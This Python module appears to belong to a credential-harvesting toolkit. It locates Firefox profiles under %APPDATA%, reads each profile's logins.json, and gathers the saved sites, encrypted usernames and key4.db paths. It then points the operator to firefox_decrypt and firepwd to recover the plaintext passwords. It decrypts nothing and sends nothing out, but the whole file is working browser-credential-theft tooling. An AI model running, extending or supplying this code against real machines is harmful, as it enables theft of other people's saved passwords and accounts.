#!/usr/bin/env python3
"""
Firefox Password Decryptor
Extract Firefox saved passwords (NSS encryption, not DPAPI)
"""

import os
import json
from pathlib import Path
from typing import List, Dict


class FirefoxDecryptor:
    """
    Extract Firefox saved passwords
    
    Location: %APPDATA%\Mozilla\Firefox\Profiles\
    Encryption: NSS (Network Security Services), NOT DPAPI
    Note: Requires firefox_decrypt or similar tool for actual decryption
    """
    
    DECRYPTOR_NAME = "firefox"
    REQUIRES_ADMIN = False
    
    def __init__(self, output_dir: Path):
        self.output_dir = Path(output_dir)
        self.firefox_path = os.path.expandvars(
            r'%APPDATA%\Mozilla\Firefox\Profiles'
        )
    
    def decrypt(self) -> List[Dict]:
        """
        Extract Firefox password information
        
        Note: Actual decryption requires NSS libraries or firefox_decrypt
        
        Returns:
            List of credential dictionaries (URLs only, not decrypted)
        """
        print(f"\n[*] Extracting Firefox password information...")
        print(f"[*] Profile directory: {self.firefox_path}")
        
        credentials = []
        
        # Check if Firefox profiles exist
        if not os.path.exists(self.firefox_path):
            print(f"[-] Firefox profiles directory not found")
            print(f"[!] Firefox may not be installed")
            return credentials
        
        try:
            # Find profile directories
            profiles = [d for d in Path(self.firefox_path).iterdir() if d.is_dir()]
            
            if not profiles:
                print(f"[-] No Firefox profiles found")
                return credentials
            
            print(f"[+] Found {len(profiles)} Firefox profile(s)")
            
            for profile in profiles:
                print(f"\n[*] Profile: {profile.name}")
                
                logins_file = profile / "logins.json"
                key_file = profile / "key4.db"
                
                if logins_file.exists():
                    # Load logins.json
                    with open(logins_file, 'r', encoding='utf-8') as f:
                        logins_data = json.load(f)
                    
                    if 'logins' in logins_data:
                        login_count = len(logins_data['logins'])
                        print(f"[+] Found {login_count} saved login(s)")
                        
                        for login in logins_data['logins']:
                            cred = {
                                'source': 'Firefox',
                                'profile': profile.name,
                                'url': login.get('hostname', ''),
                                'username': login.get('encryptedUsername', '[Encrypted]'),
                                'password': '[Encrypted - NSS]',
                                'logins_file': str(logins_file),
                                'key_file': str(key_file) if key_file.exists() else None
                            }
                            
                            credentials.append(cred)
                            
                            print(f"[+] Found credential:")
                            print(f"    URL: {cred['url']}")
                            print(f"    Username: [Encrypted]")
                            print(f"    Password: [Encrypted - NSS]")
                    else:
                        print(f"[-] No logins found in profile")
                else:
                    print(f"[-] logins.json not found in profile")
                
                if key_file.exists():
                    print(f"[+] Encryption key database: {key_file}")
                else:
                    print(f"[-] key4.db not found in profile")
            
            if credentials:
                print(f"\n[!] IMPORTANT: Firefox uses NSS encryption, not DPAPI")
                print(f"[!] Use firefox_decrypt tool for actual decryption:")
                print(f"[!]   https://github.com/unode/firefox_decrypt")
                print(f"[!]   pip install firefox-decrypt")
                print(f"[!]   firefox_decrypt.py")
        
        except json.JSONDecodeError as e:
            print(f"[-] Error parsing logins.json: {e}")
        
        except Exception as e:
            print(f"[-] Firefox extraction failed: {e}")
        
        return credentials
    
    def is_available(self) -> bool:
        """Check if Firefox profiles exist"""
        return os.path.exists(self.firefox_path)
    
    @staticmethod
    def get_info() -> Dict:
        """Get information about this decryptor"""
        return {
            'name': 'firefox',
            'description': 'Extract Firefox password information (NSS encryption)',
            'requires_admin': False,
            'location': r'%APPDATA%\Mozilla\Firefox\Profiles',
            'encryption': 'NSS (Network Security Services), NOT DPAPI',
            'credential_types': ['website credentials'],
            'notes': [
                'Firefox does NOT use DPAPI for encryption',
                'Uses NSS (Network Security Services)',
                'Requires firefox_decrypt or NSS libraries for decryption',
                'This module extracts URLs and metadata only',
                'Use dedicated Firefox decryption tools'
            ],
            'requirements': [
                'Firefox installed',
                'Saved passwords in Firefox'
            ],
            'decryption_tools': [
                'firefox_decrypt: https://github.com/unode/firefox_decrypt',
                'firepwd: https://github.com/lclevy/firepwd',
                'Command: firefox_decrypt.py'
            ]
        }
